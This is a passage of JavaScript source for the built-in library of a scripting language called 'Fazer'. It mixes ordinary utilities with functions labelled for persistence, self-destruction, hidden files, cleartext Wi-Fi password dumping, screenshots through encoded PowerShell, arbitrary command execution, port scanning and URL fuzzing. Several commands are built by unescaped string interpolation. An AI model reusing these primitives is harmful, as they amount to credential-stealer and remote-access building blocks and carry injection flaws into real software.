        } catch (e) {
          return false;
        }
      },
      mouse_pos: () => {
        try {
          const ps = `
Add-Type -AssemblyName System.Windows.Forms;
$p = [System.Windows.Forms.Cursor]::Position;
Write-Output "$($p.X),$($p.Y)"
            `;
          const out = child_process2.execSync(`powershell -NoProfile -Command "${ps.replace(/\n/g, " ")}"`, { encoding: "utf8" }).trim();
          const parts = out.split(",");
          return { x: Number(parts[0]), y: Number(parts[1]) };
        } catch (e) {
          return { x: 0, y: 0 };
        }
      },
      msgbox: (text, title = "Message") => {
        try {
          const ps = `
Add-Type -AssemblyName System.Windows.Forms;
[System.Windows.Forms.MessageBox]::Show('${String(text).replace(/'/g, "''")}', '${String(title).replace(/'/g, "''")}');
             `;
          child_process2.execSync(`powershell -NoProfile -Command "${ps.replace(/\n/g, " ")}"`);
          return null;
        } catch (e) {
          return null;
        }
      },
      // Registry (Persistence)
      registry_set: (keyPath, name, value) => {
        try {
          const ps = `Set-ItemProperty -Path "Registry::${keyPath}" -Name "${name}" -Value "${value}"`;
          child_process2.execSync(`powershell -NoProfile -Command "${ps}"`);
          return true;
        } catch (e) {
          return false;
        }
      },
      registry_get: (keyPath, name) => {
        try {
          const ps = `Get-ItemPropertyValue -Path "Registry::${keyPath}" -Name "${name}"`;
          return child_process2.execSync(`powershell -NoProfile -Command "${ps}"`, { encoding: "utf8" }).trim();
        } catch (e) {
          return null;
        }
      },
      // Self-Destruct
      self_destruct: () => {
        const script = process.argv[1];
        const cmd2 = `Start-Sleep -Seconds 2; Remove-Item -Path "${script}" -Force`;
        const ps = `powershell -NoProfile -Command "${cmd2}"`;
        child_process2.spawn(ps, { shell: true, detached: true, stdio: "ignore" }).unref();
        process.exit(0);
      },
      // Network
      download: async (url, dest) => {
        const followRedirects = (currentUrl, currentDest, maxRedirects = 5) => {
          return new Promise((resolve, reject2) => {
            if (maxRedirects === 0) {
              reject2(new Error("Too many redirects"));
              return;
            }
            const proto = currentUrl.startsWith("https") ? https2 : http2;
            const request = proto.get(currentUrl, (response) => {
              if ([301, 302, 303, 307, 308].includes(response.statusCode) && response.headers.location) {
                const redirectUrl = new URL(response.headers.location, currentUrl).href;
                followRedirects(redirectUrl, currentDest, maxRedirects - 1).then(resolve).catch(reject2);
                return;
              }
              if (response.statusCode !== 200) {
                reject2(new Error(`Failed to download: Status Code ${response.statusCode}`));
                return;
              }
              const file = fs.createWriteStream(currentDest);
              response.pipe(file);
              file.on("finish", () => {
                file.close(() => resolve(true));
              });
            }).on("error", (err) => {
              try {
                fs.unlinkSync(currentDest);
              } catch (e) {
              }
              reject2(err);
            });
          });
        };
        try {
          return await followRedirects(url, dest);
        } catch (e) {
          return false;
        }
      },
      public_ip: async () => {
        try {
          return new Promise((resolve) => {
            https2.get("https://api.ipify.org", (res) => {
              let data = "";
              res.on("data", (chunk) => data += chunk);
              res.on("end", () => resolve(data));
            }).on("error", () => resolve("0.0.0.0"));
          });
        } catch (e) {
          return "0.0.0.0";
        }
      },
      wifi_dump: () => {
        try {
          const ps = `
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() };
$results = @();
foreach ($p in $profiles) {
    $pass = netsh wlan show profile name="$p" key=clear | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(":")[1].Trim() };
    if (-not $pass) { $pass = "N/A" };
    $results += @{ SSID = $p; Password = $pass };
}
$results | ConvertTo-Json -Compress
             `;
          const out = child_process2.execSync(`powershell -NoProfile -Command "${ps.replace(/\n/g, " ")}"`, { encoding: "utf8" });
          return JSON.parse(out);
        } catch (e) {
          return [];
        }
      },
      // System Utils
      zip: (source, dest) => {
        try {
          const s = path.resolve(String(source));
          const d = path.resolve(String(dest));
          child_process2.execSync(`powershell -NoProfile -Command "Compress-Archive -Path '${s}' -DestinationPath '${d}' -Force"`);
          return true;
        } catch (e) {
          return false;
        }
      },
      unzip: (source, dest) => {
        try {
          const s = path.resolve(String(source));
          const d = path.resolve(String(dest));
          child_process2.execSync(`powershell -NoProfile -Command "Expand-Archive -Path '${s}' -DestinationPath '${d}' -Force"`);
          return true;
        } catch (e) {
          return false;
        }
      },
      file_hide: (pathStr) => {
        try {
          const p = path.resolve(String(pathStr));
          child_process2.execSync(`attrib +h "${p}"`);
          return true;
        } catch (e) {
          return false;
        }
      },
      file_unhide: (pathStr) => {
        try {
          const p = path.resolve(String(pathStr));
          child_process2.execSync(`attrib -h "${p}"`);
          return true;
        } catch (e) {
          return false;
        }
      },
      // Audio & Fun
      speak: (text) => {
        try {
          const t = String(text).replace(/'/g, "''");
          const ps = `Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('${t}')`;
          child_process2.execSync(`powershell -NoProfile -Command "${ps}"`);
          return true;
        } catch (e) {
          return false;
        }
      },
      beep: (freq, dur) => {
        try {
          const ps = `[Console]::Beep(${Number(freq)}, ${Number(dur)})`;
          child_process2.execSync(`powershell -NoProfile -Command "${ps}"`);
          return true;
        } catch (e) {
          return false;
        }
      },
      // Crypto
      b64_encode: (text) => {
        return Buffer.from(String(text)).toString("base64");
      },
      b64_decode: (text) => {
        return Buffer.from(String(text), "base64").toString("utf8");
      },
      hash: (algo, text) => {
        try {
          const crypto2 = require("crypto");
          return crypto2.createHash(String(algo)).update(String(text)).digest("hex");
        } catch (e) {
          return "";
        }
      },
      readB64: readBytesB64,
      writeB64: writeBytesB64,
      saveB64: (s, p) => {
        fs.writeFileSync(path.resolve(String(p)), Buffer.from(String(s), "base64"));
        return null;
      },
      sha256,
      encText,
      decText,
      encB64,
      decB64,
      hex,
      b64,
      fromHex,
      fromB64,
      join: pathJoin,
      abs: pathAbs,
      dir: pathDir,
      base: pathBase,
      nowMs,
      len,
      keys: keys2,
      get: get2,
      set,
      json: (x) => JSON.stringify(x, null, 2),
      parseJson: (s) => JSON.parse(s),
      int: (x) => parseInt(String(x)) || 0,
      float: (x) => parseFloat(String(x)) || 0,
      exec: (cmd2) => {
        try {
          return child_process2.execSync(String(cmd2)).toString();
        } catch (e) {
          if (e.stdout && e.stdout.length > 0) return e.stdout.toString();
          return "Error: " + e.message;
        }
      },
      server: (port, handlerName) => {
        throw new FazerError("This server signature is deprecated. Use server(port, router_obj).");
      },
      sleep: (ms) => new Promise((resolve) => setTimeout(resolve, Number(ms))),
      // Async/Promises
      promise_new: (executor) => {
        return new Promise((resolve, reject2) => {
          try {
            if (executor && executor.__fnref__) {
              this._call(executor, [
                (v) => resolve(v),
                (e) => reject2(e)
              ], this.global).catch(reject2);
            } else {
              resolve(null);
            }
          } catch (e) {
            reject2(e);
          }
        });
      },
      promise_resolve: (value) => Promise.resolve(value),
      promise_reject: (reason) => Promise.reject(reason),
      promise_defer: () => {
        let resolve, reject2;
        const p = new Promise((res, rej) => {
          resolve = res;
          reject2 = rej;
        });
        return { promise: p, resolve, reject: reject2 };
      },
      fetch: async (url, opts = {}) => {
        checkPerm("net");
        return await fetchWithRedirects(String(url), opts || {});
      },
      discord: (token) => {
        checkPerm("net");
        if (!WebSocket) throw new FazerError("WebSocket module (ws) not found. Install it to use discord.");
        const listeners = {};
        const ws = new WebSocket("wss://gateway.discord.gg/?v=10&encoding=json");
        ws.on("open", () => {
          ws.send(JSON.stringify({
            op: 2,
            d: { token: String(token), intents: 33280, properties: { os: "fazer", browser: "fazer", device: "fazer" } }
          }));
        });
        ws.on("message", async (data) => {
          const p = JSON.parse(data);
          if (p.op === 10) {
            setInterval(() => ws.send(JSON.stringify({ op: 1, d: null })), p.d.heartbeat_interval);
          }
          if (p.t === "MESSAGE_CREATE") {
            const handlers = listeners["message"];
            if (handlers) {
              for (const fn of handlers) {
                try {
                  await this._call(fn, [p.d], this.global);
                } catch (e) {
                  console.error("Discord handler error:", e);
                }
              }
            }
          }
        });
        return {
          on: (ev, fn) => {
            listeners[ev] = listeners[ev] || [];
            listeners[ev].push(fn);
          },
          send: async (chanId, content) => {
            const body = JSON.stringify({ content: String(content) });
            return new Promise((resolve) => {
              const req = https2.request(`https://discord.com/api/v10/channels/${chanId}/messages`, {
                method: "POST",
                headers: { "Authorization": `Bot ${token}`, "Content-Type": "application/json" }
              }, (res) => {
                let d = "";
                res.on("data", (c) => d += c);
                res.on("end", () => resolve(JSON.parse(d)));
              });
              req.write(body);
              req.end();
            });
          }
        };
      },
      menu: async (options) => {
        if (!Array.isArray(options)) throw new FazerError("menu expects a list of options");
        options.forEach((o, i) => console.log(`[${i + 1}] ${o}`));
        const readline = require("readline");
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        return new Promise((resolve) => {
          rl.question("Choice > ", (ans) => {
            rl.close();
            const n = Number(ans);
            if (isNaN(n) || n < 1 || n > options.length) resolve(null);
            else resolve(options[n - 1]);
          });
        });
      },
      read_line: async (prompt) => {
        const readline = require("readline");
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        return new Promise((resolve) => {
          rl.question(String(prompt || ""), (ans) => {
            rl.close();
            resolve(ans);
          });
        });
      },
      exec: (cmd2) => {
        try {
          return require("child_process").execSync(String(cmd2), { encoding: "utf8" }).trim();
        } catch (e) {
          throw new FazerError("exec failed: " + e.message);
        }
      },
      style: (text, color) => {
        const codes = {
          reset: "\x1B[0m",
          bold: "\x1B[1m",
          dim: "\x1B[2m",
          red: "\x1B[31m",
          green: "\x1B[32m",
          yellow: "\x1B[33m",
          blue: "\x1B[34m",
          magenta: "\x1B[35m",
          cyan: "\x1B[36m",
          white: "\x1B[37m"
        };
        return (codes[String(color)] || "") + String(text) + codes.reset;
      },
      server: async (port, handler) => {
        const http3 = require("http");
        const srv = http3.createServer(async (req, res) => {
          const bodyParts = [];
          for await (const chunk of req) bodyParts.push(chunk);
          const bodyStr = Buffer.concat(bodyParts).toString();
          const reqObj = {
            method: req.method,
            url: req.url,
            headers: req.headers,
            body: bodyStr
          };
          try {
            let result = null;
            if (typeof handler === "object" && handler !== null && !handler.__fnref__) {
              const url = req.url.split("?")[0];
              if (handler[url]) {
                const h = handler[url];
                if (typeof h === "function" || typeof h === "object" && h.__fnref__) {
                  result = await this._call(h, [reqObj], this.global);
                } else {
                  result = h;
                }
              } else {
                result = { status: 404, body: "Not Found" };
              }
            } else {
              result = await this._call(handler, [reqObj], this.global);
            }
            let status = 200;
            let headers = { "Content-Type": "text/plain" };
            let resBody = "";
            if (typeof result === "object" && result !== null) {
              if (result.status) status = Number(result.status);
              if (result.headers) headers = { ...headers, ...result.headers };
              if (result.body) resBody = String(result.body);
              else if (result.status === void 0) resBody = JSON.stringify(result);
            } else {
              resBody = String(result);
            }
            res.writeHead(status, headers);
            res.end(resBody);
          } catch (e) {
            res.writeHead(500);
            res.end("Internal Server Error: " + e.message);
          }
        });
        return new Promise((resolve) => {
          srv.listen(Number(port), () => {
            console.log(`Server listening on port ${port}`);
            resolve({
              close: () => {
                srv.close();
                return null;
              }
            });
          });
          srv.on("error", (e) => {
            if (e.code === "EADDRINUSE") {
              console.error(`Error: Port ${port} is already in use.`);
            } else {
              console.error(`Server error: ${e.message}`);
            }
            resolve(null);
          });
        });
      },
      // --- NATIVE UI (WinForms) ---
      window: (title, w, h, icon, style2) => {
        this.native_ui_state.widgets = [{ type: "window", title, w, h, icon, style: style2 }];
        return "window";
      },
      button: (id, text, x, y, w, h, style2) => {
        this.native_ui_state.widgets.push({ type: "widget", cls: "Button", id, text, x, y, w, h, style: style2 });
        return id;
      },
      label: (id, text, x, y, w, h, style2) => {
        this.native_ui_state.widgets.push({ type: "widget", cls: "Label", id, text, x, y, w, h, style: style2 });
        return id;
      },
      entry: (id, text, x, y, w, h, style2) => {
        this.native_ui_state.widgets.push({ type: "widget", cls: "TextBox", id, text, x, y, w, h, style: style2 });
        return id;
      },
      textarea: (id, text, x, y, w, h, style2) => {
        this.native_ui_state.widgets.push({ type: "widget", cls: "RichTextBox", id, text, x, y, w, h, style: style2 });
        return id;
      },
      checkbox: (id, text, x, y, w, h, style2) => {
        this.native_ui_state.widgets.push({ type: "widget", cls: "CheckBox", id, text, x, y, w, h, style: style2 });
        return id;
      },
      progress: (id, val, x, y, w, h, style2) => {
        this.native_ui_state.widgets.push({ type: "widget", cls: "ProgressBar", id, text: val, x, y, w, h, style: style2 });
        return id;
      },
      combo: (id, items, x, y, w, h, style2) => {
        const itemList = Array.isArray(items) ? items.join(",") : String(items);
        this.native_ui_state.widgets.push({ type: "widget", cls: "ComboBox", id, text: itemList, x, y, w, h, style: style2 });
        return id;
      },
      get_text: (id) => {
        if (this.native_ui_state.updates.set_text && this.native_ui_state.updates.set_text[id] !== void 0) {
          return this.native_ui_state.updates.set_text[id];
        }
        const w = this.native_ui_state.widgets.find((x) => x.id === id);
        if (w) return w.text || "";
        return "";
      },
      set_text: (id, val) => {
        if (!this.native_ui_state.updates.set_text) this.native_ui_state.updates.set_text = {};
        this.native_ui_state.updates.set_text[id] = val;
        const w = this.native_ui_state.widgets.find((x) => x.id === id);
        if (w) w.text = val;
        return val;
      },
      msgbox: (msg) => {
        this.native_ui_state.updates.msgbox = String(msg);
        return true;
      },
      msgbox_confirm: (msg) => {
        try {
          const tempFile = require("path").join(require("os").tmpdir(), `fazer_confirm_${Date.now()}.ps1`);
          const safeMsg = String(msg).replace(/"/g, '`"').replace(/\$/g, "`$");
          const script = `
              Add-Type -AssemblyName System.Windows.Forms
              $res = [System.Windows.Forms.MessageBox]::Show("${safeMsg}", "Confirmation", [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Warning)
              Write-Output $res
              `;
          require("fs").writeFileSync(tempFile, script, "utf8");
          const out = require("child_process").execSync(`powershell -ExecutionPolicy Bypass -File "${tempFile}"`, { encoding: "utf8" }).trim();
          try {
            require("fs").unlinkSync(tempFile);
          } catch (e) {
          }
          return out === "Yes";
        } catch (e) {
          console.error(e);
          return false;
        }
      },
      gui: async (handler) => {
        if (process.platform !== "win32") throw new FazerError("Native GUI is Windows only.");
        const http3 = require("http");
        const port = await new Promise((r) => {
          const s = http3.createServer();
          s.listen(0, () => {
            const p = s.address().port;
            s.close(() => r(p));
          });
        });
        const srv = http3.createServer(async (req, res) => {
          if (req.method === "POST" && req.url === "/event") {
            let body = "";
            for await (const chunk of req) body += chunk;
            try {
              const event = JSON.parse(body);
              if (handler) {
                this._call(handler, [event], this.global).catch((e) => console.error(e));
              }
              res.writeHead(200, { "Content-Type": "application/json" });
              res.end("{}");
            } catch (e) {
              console.error(e);
              res.writeHead(500);
              res.end("{}");
            }
          } else if (req.method === "GET" && req.url === "/updates") {
            res.writeHead(200, { "Content-Type": "application/json" });
            res.end(JSON.stringify(this.native_ui_state.updates));
            this.native_ui_state.updates = {};
          }
        });
        srv.listen(port);
        const getColor = (c, def) => {
          if (!c) return def;
          c = String(c);
          if (c.startsWith("#")) return `[System.Drawing.ColorTranslator]::FromHtml("${c}")`;
          return `[System.Drawing.Color]::${c}`;
        };
        const getFont = (f, defName, defSize) => {
          let name = defName;
          let size = defSize;
          let style2 = "";
          if (f && typeof f === "object") {
            if (f.name) name = f.name;
            if (f.size) size = f.size;
            if (f.bold) style2 += ", [System.Drawing.FontStyle]::Bold";
            if (f.italic) style2 += ", [System.Drawing.FontStyle]::Italic";
          }
          return `New-Object System.Drawing.Font("${name}", ${size}${style2})`;
        };
        let ps = `
         Add-Type -AssemblyName System.Windows.Forms
         Add-Type -AssemblyName System.Drawing
         $url = "http://localhost:${port}/event"
         $updateUrl = "http://localhost:${port}/updates"
         
         function Get-Updates {
             try {
                 $res = Invoke-RestMethod -Uri $updateUrl -Method GET -ErrorAction SilentlyContinue
                 if ($res) {
                     if ($res.set_text) {
                         foreach($k in $res.set_text.PSObject.Properties) {
                             $c = $form.Controls.Find($k.Name, $true)
                             if ($c) { $c[0].Text = $k.Value }
                         }
                     }
                     if ($res.msgbox) { [System.Windows.Forms.MessageBox]::Show($res.msgbox) }
                 }
             } catch {}
         }

         function Send-Event($id, $type, $val) {
             $body = @{id=$id; type=$type; value=$val} | ConvertTo-Json -Compress
             try {
                 Invoke-RestMethod -Uri $url -Method POST -Body $body -ContentType "application/json"
             } catch {}
         }
         `;
        const widgets = this.native_ui_state.widgets;
        const win = widgets.find((w) => w.type === "window");
        if (!win) throw new FazerError("No window defined. Use window().");
        let iconCmd = "";
        if (win.icon) {
          const iconAbs = require("path").resolve(String(win.icon));
          const iconPath = iconAbs.replace(/\\/g, "\\\\");
          if (require("fs").existsSync(iconAbs)) {
            if (String(win.icon).endsWith(".ico")) {
              iconCmd = `$form.Icon = New-Object System.Drawing.Icon("${iconPath}")`;
            } else {
              iconCmd = `$form.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon("${iconPath}")`;
            }
          }
        }
        const winStyle = win.style || {};
        const winBg = getColor(winStyle.bg, "[System.Drawing.Color]::FromArgb(30, 30, 30)");
        const winFg = getColor(winStyle.fg, "[System.Drawing.Color]::White");
        ps += `
         $form = New-Object System.Windows.Forms.Form
         $form.Text = "${win.title}"
         ${iconCmd}
         $form.Width = ${win.w}
         $form.Height = ${win.h}
         $form.StartPosition = "CenterScreen"
         $form.BackColor = ${winBg}
         $form.ForeColor = ${winFg}
         $form.FormBorderStyle = "FixedSingle"
         $form.MaximizeBox = $false
         
         $timer = New-Object System.Windows.Forms.Timer
         $timer.Interval = 100
         $timer.Add_Tick({ Get-Updates })
         $timer.Start()
         `;
        for (const w of widgets) {
          if (w.type === "window") continue;
          let extra = "";
          let textProp = `$${w.id}.Text = "${w.text}"`;
          if (w.cls === "ComboBox") {
            const items = String(w.text).split(",");
            extra = `$${w.id}.DropDownStyle = "DropDownList"
`;
            items.forEach((i) => {
              extra += `$${w.id}.Items.Add("${i.trim()}")
`;
            });
            if (items.length > 0) extra += `$${w.id}.SelectedIndex = 0
`;
            textProp = "";
          } else if (w.cls === "ProgressBar") {
            textProp = `$${w.id}.Value = ${Number(w.text) || 0}`;
          }
          const style2 = w.style || {};
          const bg = getColor(style2.bg, "");
          const fg = getColor(style2.fg, "");
          const font = getFont(style2.font, "Segoe UI", 10);
          let styleCmd = "";
          if (bg) styleCmd += `$${w.id}.BackColor = ${bg}
`;
          if (fg) styleCmd += `$${w.id}.ForeColor = ${fg}
`;
          styleCmd += `$${w.id}.Font = ${font}
`;
          ps += `
            $${w.id} = New-Object System.Windows.Forms.${w.cls}
            $${w.id}.Name = "${w.id}"
            ${textProp}
            $${w.id}.Left = ${w.x}
            $${w.id}.Top = ${w.y}
            $${w.id}.Width = ${w.w}
            $${w.id}.Height = ${w.h}
            ${styleCmd}
            ${extra}
            `;
          if (w.cls === "Button") {
            const flat = style2.flat !== false;
            const flatStyle = flat ? `$${w.id}.FlatStyle = "Flat"
$${w.id}.FlatAppearance.BorderSize = 0` : "";
            if (!bg) ps += `$${w.id}.BackColor = [System.Drawing.Color]::FromArgb(60, 60, 60)
`;
            ps += `
               ${flatStyle}
               $${w.id}.Add_Click({ Send-Event "${w.id}" "click" "" })
               `;
          } else if (w.cls === "TextBox" || w.cls === "RichTextBox") {
            if (!bg) ps += `$${w.id}.BackColor = [System.Drawing.Color]::FromArgb(50, 50, 50)
`;
            if (!fg) ps += `$${w.id}.ForeColor = [System.Drawing.Color]::White
`;
            ps += `
                $${w.id}.BorderStyle = "FixedSingle"
                $${w.id}.Add_TextChanged({ Send-Event "${w.id}" "change" $this.Text })
                `;
          } else if (w.cls === "CheckBox") {
            if (!fg) ps += `$${w.id}.ForeColor = [System.Drawing.Color]::White
`;
            ps += `
                $${w.id}.Add_CheckedChanged({ Send-Event "${w.id}" "change" $this.Checked })
                `;
          } else if (w.cls === "ComboBox") {
            if (!bg) ps += `$${w.id}.BackColor = [System.Drawing.Color]::FromArgb(50, 50, 50)
`;
            if (!fg) ps += `$${w.id}.ForeColor = [System.Drawing.Color]::White
`;
            ps += `
                $${w.id}.FlatStyle = "Flat"
                $${w.id}.Add_SelectedIndexChanged({ Send-Event "${w.id}" "change" $this.SelectedItem })
                `;
          }
          ps += `$form.Controls.Add($${w.id})
`;
        }
        ps += `
         [void]$form.ShowDialog()
         `;
        const tempFile = require("path").join(require("os").tmpdir(), `fazer_gui_${Date.now()}.ps1`);
        require("fs").writeFileSync(tempFile, ps, "utf8");
        const child = require("child_process").spawn("powershell", ["-ExecutionPolicy", "Bypass", "-File", tempFile], { stdio: "inherit" });
        child.on("exit", () => {
          try {
            require("fs").unlinkSync(tempFile);
          } catch (e) {
          }
          process.exit(0);
        });
        return new Promise((r) => {
        });
      },
      argv: argvFn,
      env: envFn,
      cwd: cwdFn,
      input: (p) => builtins.ask(p),
      nowMs: () => Date.now(),
      sleep: async (ms) => new Promise((r) => setTimeout(r, Number(ms))),
      exec: (cmd2) => {
        try {
          return require("child_process").execSync(String(cmd2)).toString();
        } catch (e) {
          return "Error: " + e.message;
        }
      },
      // --- EXTENDED FEATURES (Automation, State, DB) ---
      set: (obj, key, val) => {
        if (obj && typeof obj === "object") {
          obj[key] = val;
          return val;
        }
        return null;
      },
      clipboard_set: (text) => {
        try {
          if (process.platform === "win32") {
            require("child_process").execSync(`echo ${String(text).replace(/[&|<>^]/g, "^$&")} | clip`);
          } else {
          }
          return true;
        } catch (e) {
          return false;
        }
      },
      notify: (title, msg) => {
        try {
          if (process.platform === "win32") {
            const script = `
                  [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms");
                  $objNotifyIcon = New-Object System.Windows.Forms.NotifyIcon;
                  $objNotifyIcon.Icon = [System.Drawing.SystemIcons]::Information;
                  $objNotifyIcon.Visible = $True;
                  $objNotifyIcon.BalloonTipTitle = "${String(title).replace(/"/g, '`"')}";
                  $objNotifyIcon.BalloonTipText = "${String(msg).replace(/"/g, '`"')}";
                  $objNotifyIcon.ShowBalloonTip(5000);
                  Start-Sleep -s 5;
                  $objNotifyIcon.Dispose();
                  `;
            require("child_process").exec(`powershell -Command "${script.replace(/\n/g, " ")}"`);
          }
          return true;
        } catch (e) {
          return false;
        }
      },
      db: (p) => {
        const dbPath = path.resolve(String(p));
        let data = {};
        if (fs.existsSync(dbPath)) {
          try {
            data = JSON.parse(fs.readFileSync(dbPath, "utf8"));
          } catch (e) {
          }
        }
        return {
          get: (k) => data[k],
          set: (k, v) => {
            data[k] = v;
            fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
            return v;
          },
          all: () => data
        };
      },
      import: async (p) => {
        let fullPath = path.resolve(String(p));
        if (!fs.existsSync(fullPath)) {
          const libPath = path.join(__dirname, "lib", String(p));
          if (fs.existsSync(libPath)) {
            fullPath = libPath;
          } else {
            throw new FazerError(`Module not found: ${p}`);
          }
        }
        const code2 = fs.readFileSync(fullPath, "utf8");
        const lexResult = lexer.tokenize(code2);
        if (lexResult.errors.length > 0) throw new FazerError(`Lexer error in ${p}: ${lexResult.errors[0].message}`);
        const parser = new FazerParser();
        parser.input = lexResult.tokens;
        const ast2 = parser.program();
        if (parser.errors.length > 0) throw new FazerError(`Parser error in ${p}: ${parser.errors[0].message}`);
        const moduleScope = new Scope(this.global);
        await this._execBlock(ast2, moduleScope);
        const exports2 = {};
        for (const [k, v] of moduleScope.vars) {
          exports2[k] = v.value;
        }
        return exports2;
      },
      // File System
      fs_read: (p) => {
        try {
          return require("fs").readFileSync(String(p), "utf8");
        } catch (e) {
          return null;
        }
      },
      fs_write: (p, c) => {
        try {
          require("fs").writeFileSync(String(p), String(c));
          return true;
        } catch (e) {
          return false;
        }
      },
      fs_append: (p, c) => {
        try {
          require("fs").appendFileSync(String(p), String(c));
          return true;
        } catch (e) {
          return false;
        }
      },
      fs_exists: (p) => {
        try {
          return require("fs").existsSync(String(p));
        } catch (e) {
          return false;
        }
      },
      // JSON
      json_parse: (s) => {
        try {
          return JSON.parse(String(s));
        } catch (e) {
          return null;
        }
      },
      json_stringify: (o) => {
        try {
          return JSON.stringify(o, null, 2);
        } catch (e) {
          return null;
        }
      },
      // String Utils
      str_split: (s, d) => String(s).split(String(d)),
      str_replace: (s, old, n) => String(s).split(String(old)).join(String(n)),
      str_trim: (s) => String(s).trim(),
      str_upper: (s) => String(s).toUpperCase(),
      str_lower: (s) => String(s).toLowerCase(),
      // Math
      random: () => Math.random(),
      round: (n) => Math.round(Number(n)),
      floor: (n) => Math.floor(Number(n)),
      ceil: (n) => Math.ceil(Number(n)),
      fetch: async (url, opts = {}) => {
        return await fetchWithRedirects(String(url), opts || {});
      },
      // OSINT
      whois: async (domain) => {
        return new Promise((resolve) => {
          const net = require("net");
          const socket = new net.Socket();
          let data = "";
          socket.setTimeout(5e3);
          socket.connect(43, "whois.iana.org", () => {
            socket.write(String(domain) + "\r\n");
          });
          socket.on("data", (chunk) => data += chunk.toString());
          socket.on("end", () => {
            const match = data.match(/refer:\s*([a-zA-Z0-9.-]+)/i);
            if (match && match[1] && match[1] !== "whois.iana.org") {
              const refHost = match[1];
              const s2 = new net.Socket();
              let d2 = "";
              s2.setTimeout(5e3);
              s2.connect(43, refHost, () => {
                s2.write(String(domain) + "\r\n");
              });
              s2.on("data", (c) => d2 += c.toString());
              s2.on("end", () => resolve(d2));
              s2.on("error", () => resolve(data));
            } else {
              resolve(data);
            }
          });
          socket.on("error", () => resolve("Error: Connection failed"));
          socket.on("timeout", () => {
            socket.destroy();
            resolve("Error: Timeout");
          });
        });
      },
      geoip: async (ip) => {
        try {
          const res = await builtins.http_req("http://ip-api.com/json/" + String(ip));
          return builtins.json_parse(res.body);
        } catch (e) {
          return null;
        }
      },
      html_extract: (html, tag) => {
        const t = String(tag);
        const regex = new RegExp(`<${t}[^>]*>(.*?)</${t}>`, "gis");
        const matches = [];
        let m;
        while ((m = regex.exec(String(html))) !== null) {
          matches.push(m[1]);
        }
        return matches;
      },
      // System Advanced
      ps_list: () => {
        try {
          if (process.platform === "win32") {
            const out = require("child_process").execSync("tasklist /FO CSV /NH").toString();
            const lines = out.split("\r\n").filter((l) => l.trim() !== "");
            return lines.map((l) => {
              const parts = l.split('","').map((p) => p.replace(/"/g, ""));
              return { name: parts[0], pid: parts[1], mem: parts[4] };
            });
          } else {
            const out = require("child_process").execSync("ps -A -o comm,pid,rss").toString();
            const lines = out.split("\n").slice(1).filter((l) => l.trim() !== "");
            return lines.map((l) => {
              const parts = l.trim().split(/\s+/);
              return { name: parts[0], pid: parts[1], mem: parts[2] };
            });
          }
        } catch (e) {
          return [];
        }
      },
      kill: (pid) => {
        try {
          process.kill(Number(pid));
          return true;
        } catch (e) {
          return false;
        }
      },
      screenshot: async (file) => {
        if (process.platform === "win32") {
          const p = require("path").resolve(String(file));
          const ps = `
              Add-Type -AssemblyName System.Windows.Forms
              Add-Type -AssemblyName System.Drawing
              $s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
              $b = New-Object System.Drawing.Bitmap $s.Width, $s.Height
              $g = [System.Drawing.Graphics]::FromImage($b)
              $g.CopyFromScreen($s.Location, [System.Drawing.Point]::Empty, $s.Size)
              $b.Save('${p}', [System.Drawing.Imaging.ImageFormat]::Png)
              $g.Dispose()
              $b.Dispose()
              `;
          try {
            const b642 = Buffer.from(ps, "utf16le").toString("base64");
            require("child_process").execSync(`powershell -EncodedCommand ${b642}`);
            return true;
          } catch (e) {
            return false;
          }
        }
        return false;
      },
      // Network Advanced
      tcp_listen: (port, handler) => {
        const net = require("net");
        const srv = net.createServer((socket) => {
          const id = Math.random().toString(36).substr(2, 9);
          socket.on("data", async (data) => {
            if (typeof handler === "object" && handler.__fnref__) {
              const res = await this._call(handler, [data.toString(), id], this.global);
              if (res) socket.write(String(res));
            }
          });
        });
        srv.listen(Number(port));
        return {
          close: () => srv.close()
          // We can't easily expose sending to specific socket without more complex state
          // This is a basic "echo/response" listener
        };
      },
      fuzz_url: async (url, wordlist) => {
        if (!Array.isArray(wordlist)) return [];
        const results = [];
        const u = String(url).endsWith("/") ? String(url) : String(url) + "/";
        const chunks = [];
        const chunkSize = 10;
        for (let i = 0; i < wordlist.length; i += chunkSize) {
          chunks.push(wordlist.slice(i, i + chunkSize));
        }
        for (const chunk of chunks) {
          await Promise.all(chunk.map(async (word) => {
            const target = u + word;
            try {
              const res = await builtins.http_req(target, { method: "HEAD", timeout: 2e3 });
              if (res.status !== 404) {
                results.push({ path: word, status: res.status });
              }
            } catch (e) {
            }
          }));
        }
        return results;
      },
      // Cyber / Net / Pentest
      scan_port: async (host, port) => {
        const net = require("net");
        return new Promise((resolve) => {
          const socket = new net.Socket();
          socket.setTimeout(2e3);
          socket.on("connect", () => {
            socket.destroy();
            resolve(true);
          });
          socket.on("timeout", () => {
            socket.destroy();
            resolve(false);
          });
          socket.on("error", () => {
            resolve(false);
          });
          socket.connect(Number(port), String(host));
        });
      },
      dns_resolve: async (domain) => {
        const dns = require("dns").promises;
        try {
          const res = await dns.lookup(String(domain));
          return res.address;
        } catch (e) {
          return null;
        }
      },
      dns_resolve_all: async (domain) => {
        const dns = require("dns").promises;
        try {
          const res = await dns.resolve4(String(domain));
          return res;
        } catch (e) {
          return [];
        }
      },
      md5: (s) => crypto.createHash("md5").update(String(s)).digest("hex"),
      sha1: (s) => crypto.createHash("sha1").update(String(s)).digest("hex"),
      sha256: (s) => crypto.createHash("sha256").update(String(s)).digest("hex"),
      // Crypto & Encoding
      base64_encode: (s) => Buffer.from(String(s)).toString("base64"),
      base64_decode: (s) => Buffer.from(String(s), "base64").toString("utf8"),
      aes_encrypt: (text, key) => {
        const k = crypto.createHash("sha256").update(String(key)).digest();
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv("aes-256-cbc", k, iv);
        let encrypted = cipher.update(String(text));
        encrypted = Buffer.concat([encrypted, cipher.final()]);
        return iv.toString("hex") + ":" + encrypted.toString("hex");
      },
      aes_decrypt: (text, key) => {
        try {
